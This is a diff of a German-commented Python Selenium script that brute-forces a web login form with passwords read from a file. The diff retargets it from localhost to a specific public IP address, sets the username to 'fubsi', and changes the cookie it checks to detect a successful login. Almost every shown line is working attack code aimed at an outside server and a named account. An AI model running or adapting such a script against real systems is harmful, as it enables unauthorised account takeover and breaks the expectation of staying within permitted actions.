@@ -3,7 +3,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 
 driver = webdriver.Chrome()
-driver.get("http://localhost:5001/login")
+driver.get("http://141.87.60.46:5000/login")
 wait = WebDriverWait(driver, 10)
 with open("pw.txt", "r") as file:
     passwords = [line.strip() for line in file]
@@ -18,14 +18,14 @@ for password in passwords:
 
         username_input.clear()
         password_input.clear()
-        username_input.send_keys("admin")
+        username_input.send_keys("fubsi")
         password_input.send_keys(password)
         login_button.click()
 
         cookies = driver.get_cookies()
         cookie_names = [c['name'] for c in cookies]
 
-        if "name" in cookie_names:
+        if "benutzername" in cookie_names:
             print(f"[+] Passwort gefunden: {password}")
             break
         else:
